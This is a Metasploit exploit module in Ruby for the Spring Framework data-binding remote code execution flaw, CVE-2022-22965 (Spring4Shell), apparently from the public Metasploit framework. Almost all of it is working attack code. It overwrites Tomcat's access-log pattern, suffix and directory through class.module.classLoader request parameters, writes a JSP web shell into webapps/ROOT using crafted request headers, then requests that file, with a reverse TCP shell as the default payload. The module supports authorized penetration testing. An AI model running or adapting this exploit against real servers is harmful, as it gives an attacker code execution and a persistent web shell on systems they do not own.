##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
  # include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Spring Framework RCE via Data Binding',
        'Description' => %q{
          A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE)
          via data binding. The specific exploit requires the application to run on Tomcat as a WAR deployment. If the
          application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit.
          However, the nature of the vulnerability is more general, and there may be other ways to exploit it.
        },
        'Author' => [
          'helloexp', # vulnerability discovery
          'Heyder Andrade' # module
        ],
        'References' => [
          ['CVE', '2022-22965'],
          ['URL', 'https://tanzu.vmware.com/security/cve-2022-22965'],
          ['URL', 'https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement']
        ],
        'DisclosureDate' => '2022-03-30',
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_JAVA,
        'Privileged' => false,
        'Targets' => [
          ['Java Generic', {}]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'PAYLOAD' => 'java/jsp_shell_reverse_tcp'
        },
        'Notes' => {
          'AKA' => [ 'SpringShell', 'Spring4Shell' ],
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'The path to the application action', '/']),
      OptString.new('PAYLOAD_PATH', [true, 'Path to write the payload', 'webapps/ROOT'])
    ])
  end

  def check

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(Rex::Text.rand_text_alpha_lower(4..6))
    )

    return CheckCode::Unknown('Web server seems unresponsive') unless res

    if res.headers.key?('Server')
      res.headers['Server'].match(%r{(.*)/([\d|.]+)$})
    else
      res.body.match(%r{Apache\s(.*)/([\d|.]+)})
    end

    server = Regexp.last_match(1) || nil
    version = Rex::Version.new(Regexp.last_match(2)) || nil

    return Exploit::CheckCode::Safe('Application seems not be running under Tomcat') unless server && server.match(/Tomcat/)

    vprint_status("Detected a #{server} #{version} running")

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI']),
      'data' => "class.module.classLoader.DefaultAssertionStatus=#{Rex::Text.rand_text_alpha_lower(4..6)}"
    )

    # setting the default assertion status to a valid status
    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI']),
      'data' => 'class.module.classLoader.DefaultAssertionStatus=true'
    )
    cleanup
    return CheckCode::Safe unless res.code == 400

    Exploit::CheckCode::Appears
  end

  def exploit

    # reset_variables
    # Change the tomcat log location variables
    class_loader(get_payload)
    write_payload
    # reset_pattern
    register_files_for_cleanup(jsp_filename)
    execute_jsp_payload
    handler
  end

  def cleanup
    vprint_status 'Cleaning up'
    class_loader(format_payload(pattern: '', suffix: '', directory: '', prefix: '', file_date_format: ''))
    true
  end

  def format_payload(data = {})
    opts = {
      pattern: '',
      suffix: '',
      directory: '',
      prefix: '',
      file_date_format: ''
    }.merge(data)
    classloader = 'class.module.classLoader.resources'

    log_pattern = "#{classloader}.context.parent.pipeline.first.pattern=#{opts[:pattern]}"
    log_file_suffix = "#{classloader}.context.parent.pipeline.first.suffix=#{opts[:suffix]}"
    log_file_dir = "#{classloader}.context.parent.pipeline.first.directory=#{opts[:directory]}"
    log_file_prefix = "#{classloader}.context.parent.pipeline.first.prefix=#{opts[:prefix]}"
    log_file_date_format = "#{classloader}.context.parent.pipeline.first.fileDateFormat=#{opts[:file_date_format]}"

    [log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format].join('&')
  end

  def get_payload
    # rubocop:disable  Style/FormatStringToken
    stub = payload.raw.gsub('<%', '%{prefix}i').gsub('%>', '%{suffix}i')
    # rubocop:enable  Style/FormatStringToken

    opts = {
      pattern: Rex::Text.uri_encode(stub) ,
      suffix: '.jsp',
      directory: datastore['PAYLOAD_PATH'],
      prefix: jsp_filename.split('.').first,
      file_date_format: ''
    }

    format_payload(opts)

  end

  def reset_variables
    vprint_status 'Resetting Log Variables'
    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI']),
      'data' => "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=#{rand_text_numeric(1..5)}"
    )
  end

  def class_loader(body_data)
    # vprint_status 'Modifying Log Configurations'
    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI']),
      'data' => body_data
    )
    # Changes take some time to populate on tomcat
    sleep(3)
  end

  def write_payload
    vprint_status 'Send the packet that writes the web shell'
    send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(datastore['TARGETURI']),
      'headers' => {
        'prefix' => '<%',
        'suffix' => '%>//',
        'c' => 'Runtime'
      }
    )
    sleep(1)
  end

  # def reset_pattern
  #   vprint_status 'Reset the pattern to prevent future writes into the file'
  #   send_request_cgi(
  #     'method' => 'POST',
  #     'uri' => normalize_uri(datastore['TARGETURI']),
  #     'data' => 'class.module.classLoader.resources.context.parent.pipeline.first.pattern='
  #   )
  #   sleep(5)
  # end

  def execute_jsp_payload
    jsp_uri = normalize_uri('/', jsp_filename)

    print_status('Executing JSP payload')
    vprint_status(full_uri(jsp_uri))

    sleep(5)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri("/#{jsp_filename}")
    }, 5)
    fail_with(Failure::UnexpectedReply, "Seems the payload haven't been written") unless res.code.to_i == 200

  end

  def jsp_filename
    @jsp_filename ||= "#{rand_text_alphanumeric(8..16)}.jsp"
  end

end
